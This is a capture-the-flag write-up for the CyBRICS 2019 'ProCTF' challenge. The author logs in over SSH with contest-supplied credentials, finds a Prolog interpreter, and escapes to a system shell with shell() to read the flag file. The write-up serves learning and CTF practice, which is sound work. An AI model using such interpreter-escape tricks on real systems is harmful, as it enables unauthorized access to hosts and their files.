---
title: 'CyBRICS Quals 2019: ProCTF (CTB)'
layout: post
date: '2019-07-22'
tags:
- CTF
- writeup
- Cybrics Qualifiers 2019
- CTB
- Misc
comments: true
---

> We Provide you a Login for your scientific researches. Don't try to find the flag.
> ssh pro@95.179.148.72
> Password: iamthepr0

In this challenge, we are provided with the credentials to ssh into a host. Let's start off by connecting.

```
vagrant@ubuntu-cosmic:/vagrant$ ssh pro@95.179.148.72

pro@95.179.148.72's password:
Welcome to Ubuntu 19.04 (GNU/Linux 5.0.0-15-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Jul 22 07:10:39 UTC 2019

  System load:                    1.63
  Usage of /:                     11.6% of 220.08GB
  Memory usage:                   14%
  Swap usage:                     0%
  Processes:                      219
  Users logged in:                1
  IP address for enp1s0:          95.179.148.72
  IP address for docker0:         172.17.0.1
  IP address for br-62bc0c6d2f97: 172.19.0.1


84 updates can be installed immediately.
48 of these updates are security updates.


WARNING: Your kernel does not support swap limit capabilities or the cgroup is not mounted. Memory limited without swap.
?-
```

Well, that's interesting. This seems like some kind of interpreter or shell. Let's play around with it for a bit.

```
?- ^C
^C

WARNING: By typing Control-C twice, you have forced an asynchronous
WARNING: interrupt.  Your only SAFE operations are: c(ontinue), p(id),
WARNING: s(stack) and e(xit).  Notably a(abort) often works, but
WARNING: leaves the system in an UNSTABLE state

Action (h for help) ? Options:
a:           abort         b:           break
c:           continue      e:           exit
g:           goals         s:           C-backtrace
t:           trace         p:		  Show PID
h (?):       help
Action (h for help) ?
```

Okay, looks like we have some output. Because i'm not too sure what kind of interpreter/shell this is, i'm going to dump the whole thing into google.

![](/images/proctf/image01.png)

Seems like we're dealing with some kind of [Prolog](https://en.wikipedia.org/wiki/Prolog) interpreter.

```
?- print('Hello').
'Hello'
true.
```

What if I could just somehow spawn a shell? Hmm.

```
?- shell().
$ ls
bin   dev  home  lib64	mnt  proc  run	 srv  tmp  var
boot  etc  lib	 media	opt  root  sbin  sys  usr
$ cd home
$ ls
user
$ cd user
$ ls
flag.txt
$ cat flag.txt
cybrics{feeling_like_a_PRO?_that_sounds_LOGical_to_me!____g3t_it?_G37_1T?!?!_ok_N3v3Rm1nd...}
```

Welp, that totally worked.

Flag: `cybrics{feeling_like_a_PRO?_that_sounds_LOGical_to_me!____g3t_it?_G37_1T?!?!_ok_N3v3Rm1nd...}`

<script type="text/javascript" async
  src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML">
</script>
